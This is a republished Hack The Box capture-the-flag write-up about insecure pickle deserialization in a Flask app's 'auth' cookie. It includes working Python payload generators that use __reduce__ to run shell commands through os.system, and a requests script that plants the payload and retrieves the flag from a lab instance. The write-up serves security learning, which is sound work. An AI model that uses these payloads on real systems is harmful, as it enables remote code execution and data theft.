# :game_die: HTB Challenge Write-Up: Spellbound Servants

> **Original Source:** [HTB Challenge Write-Up: Spellbound Servants](https://infosecwriteups.com/htb-challenge-write-up-spellbound-servants-27f12d0e3df5)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# HTB Challenge Write-Up: Spellbound Servants


## Code Review


Spellbound Servants is a straightforward Flask web application featuring pages and APIs for user registration and login. It also includes a protected page for authenticated users.


A brief examination of the code indicates it is an *Insecure Deserialization* challenge, as suggested by the use of the `pickle` module.


```
# database.py

def login_user_db(username, password):
user = query('SELECT username FROM users WHERE username = %s AND password = %s', (username, password,), one=True)

if user:
pickled_data = base64.b64encode(pickle.dumps(user))
return pickled_data.decode("ascii")
else:
return False
```


Further investigation reveals that the “pickled” data is stored in a cookie named `auth` and is used to authenticate users on the page through the `isAuthenticated` decorator.


```
# util.py

def isAuthenticated(f):
@wraps(f)
def decorator(*args, kwargs):
# Codes omitted for brevity

try:
user = pickle.loads(base64.urlsafe_b64decode(token))
kwargs['user'] = user
return f(*args, kwargs)
except:
return abort(401, 'Unauthorised access detected!')

return decorator
```


## Local Testing


Now that we know where to place our payload, let’s test this locally and see if we can create a simple file as proof of concept for *Remote Code Execution* via Insecure Deserialization.


## Get Pat Bautista’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Let's initiate the application using the `build-docker.sh` script. While we wait for it to complete, let's create a Python script to generate our malicious payload.


```
import pickle
import base64
import os

class RCE:
def __reduce__(self):
return (os.system, ("touch proof.txt",),)

rce = RCE()
cookie = base64.b64encode(pickle.dumps(rce))
print(cookie.decode())
```


After running the Python script and generating the payload, let's test it against the local Docker instance using `curl`.


```
curl http://localhost:1337/home -H "Cookie: auth=<payload>"
```


We can confirm that the proof.txt file was created by checking inside the Docker container with the following command:


```
docker exec -it <container id> /bin/sh
```


Awesome! The payload was successful! Next, let’s enhance the process of capturing the flag from the Challenge instance.

## Exploitation


Since the application is using Flask and serving static content from the `/app/application/static` folder, we will copy the `flag.txt` file to this directory so that we can access it via HTTP. To automate the exfiltration of the flag, we will use the Python `requests` module, which we need to install.


```
import pickle
import base64
import os
import requests

class RCE:
def __reduce__(self):
return (os.system, ("cp /flag.txt /app/application/static/",),)

rce = RCE()
cookie = base64.b64encode(pickle.dumps(rce))

target = "94.237.54.42:37487" # change the target
requests.get(f"http://{target}/home", cookies={
"auth": cookie.decode()
})

response = requests.get(f"http://{target}/static/flag.txt")
print(response.text)
```


Let’s run the script.


The flag has been successfully captured!


## References

---

*Originally published on [Medium](https://infosecwriteups.com/htb-challenge-write-up-spellbound-servants-27f12d0e3df5). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
